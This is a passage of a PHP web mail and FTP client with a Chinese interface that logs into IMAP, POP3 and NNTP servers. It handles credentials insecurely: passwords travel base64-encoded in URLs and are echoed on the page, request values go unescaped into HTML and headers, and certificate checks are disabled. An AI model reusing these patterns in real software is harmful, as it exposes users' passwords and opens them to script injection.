                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("imap");
}                        

                        $_SESSION["imap"]=array('server' => '', 'uname' => '', 'pwd' => '');                    
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim($_POST["server"]) != "" && trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("imap");
} 
                        $_SESSION["imap"]=array('server' => trim(request("server")), 'uname' => trim(request("uname")), 'pwd' => trim(request("pwd")));                 
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&pagesize=".encodeuri($pagesize)."&page=1&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["imap"]["server"] != "" && $_SESSION["imap"]["uname"] != "" && $_SESSION["imap"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["imap"]["server"])))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(base64_encode(trim($_SESSION["imap"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["imap"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&page=".encodeuri($page)."&pagesize=".encodeuri($pagesize)."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                elseif (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }  
                
        if(trim(request("port"))=="143" && trim(request("servertype"))=="imap"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                if (function_exists('imap_open') && function_exists('imap_list')){
                                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                        $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                                }
                                else{
                                }
                        }                       
                }
                elseif(trim(request("port"))=="110" && trim(request("servertype"))=="pop3"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/pop3}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="993" && (trim(request("servertype"))=="imap" || trim(request("servertype"))=="pop3")){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/imap/ssl}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="995" && (trim(request("servertype"))=="imap" || trim(request("servertype"))=="pop3")){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/pop3/ssl/novalidate-cert}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="119" && trim(request("servertype"))=="nntp"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/nntp}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                else{
                        AlertBack("暂时无法接入该类服务器！" , 2);
                        break;
                }

                print_r($list);
                return;
                if (is_array($list)) {
                        //foreach ($list as $val) {
                        //      print_r(mb_convert_encoding($val, "GB2312", "UTF7-IMAP") . "\r\n");//UTF-7格式:&ftyug-
                        //}

                        //foreach ($list as $key => $val) {
                        //      echo "($key) ";
                        //      //echo imap_utf7_decode($val->name) . ",";
                        //      echo mb_convert_encoding($val->name, "GB2312", "UTF7-IMAP") . ",";
                        //      echo "'" . mb_convert_encoding($val->delimiter, "GB2312", "UTF7-IMAP") . "',";
                        //      echo mb_convert_encoding($val->attributes, "GB2312", "UTF7-IMAP") . "\r\n";
                        //}     

                        //print_r($list);                       
                }       
                else {
                        AlertBack("邮箱列表输出失败！".imap_last_error() , 2);
                        break;
                }
                //return;
                $contents = $list;              
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = count($contents);
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":trim(request("mailbox"));?></td>
        </tr>
</table>
                <?php 
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="25%">文件夹</td>
                                <td align="center">容量 - 最新 - 未读</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        //echo $i;
                        if ($debug == 1){
                        }
                        else{
                                $status = imap_status($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".preg_replace("/{[^{}]+}(.*)/", "\$1", $list[$i]), SA_ALL);
                                //print_r($status);
                                //return;                       
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"));?>" /></td>
                                <td align="center"><?php echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(preg_replace("/{[^{}]+}(.*)/", "\$1", $list[$i]))."'>".preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"))."</a>";?></td>
                                <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "mail.list":
                if ($debug == 1){
                        $mail_count = 1000;
                }
                else{
                        //echo trim(request("mailbox"));
                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".trim(request("mailbox")), base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                        $mail_count = imap_num_msg($mbox);
                }
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = $mail_count;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = 0;
                elseif ($totalpage > $page)
                        $endid = floor($mail_count-$strpagesize*($page));
                elseif ($totalpage < $page){
                        $endid = floor($mail_count-$strpagesize*($page-1));
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
        </tr>
</table>
                <?php 
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center">标题</td>
                                <td align="center" width="25%">发件人</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                $i = 0;
                for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                        if ($debug == 1){
                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '东亚银行系统升级公告'));
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        if($j!=count($mail_subject)-1){
                                                $mailsubject = (strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text'])." - ";
                                        }       
                                        else{
                                                $mailsubject = $mailsubject.(strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text']);
                                        }
                                }
                        }
                        else{
                                $list = imap_headerinfo($mbox,$i,1024,1024);//发件人字符长度，主题字符长度
                                $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                //print_r($mail_subject);
                                //return;
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        //echo $mail_subject[$j]->charset;
                                        $mailsubject = $mailsubject.((strtolower($mail_subject[$j]->charset)!='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_subject[$j]->charset),"gb2312",$mail_subject[$j]->text):$mail_subject[$j]->text);
                                }       

                                $mail_from = imap_mime_header_decode($list->fetchfrom);
                                $mailfrom = "";
                                for($j=0;$j<count($mail_from);$j++){
                                        $mailfrom = $mailfrom.((strtolower($mail_from[$j]->charset)!=='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_from[$j]->charset),"gb2312",$mail_from[$j]->text):$mail_from[$j]->text);
                                }                               
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                <td align="center"><?php echo $mailfrom;?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=imap&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                <OPTION VALUE="imap">IMAP</OPTION>
                                <OPTION VALUE="pop3">POP3</OPTION>
                                <OPTION VALUE="nntp">NNTP</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function ftp(){
if (trim(request('action')) == "ftp.download"){
    Header("Content-type:application/octet-stream");
    header("Content-Disposition: attachment; filename=".trim(request("filename")));
        $ch = curl_init();
        $url = "ftp://".base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))."@".base64_decode(trim(request("server"))).":".trim(request("port")).trim(request("dir"))."/".trim(request("filename"));
        //echo $url;
        //RETURN;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
        $xmlstr = curl_exec($ch);
        curl_close($ch); 
        echo $xmlstr; 
        return;
        exit;
}
header('Content-Type: text/html; charset=gb2312');
IF(is_wap()){
?>
<!DOCTYPE html 
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<?php 
}
?>

<head>
<?php 
$style = new css();
$style->ico();
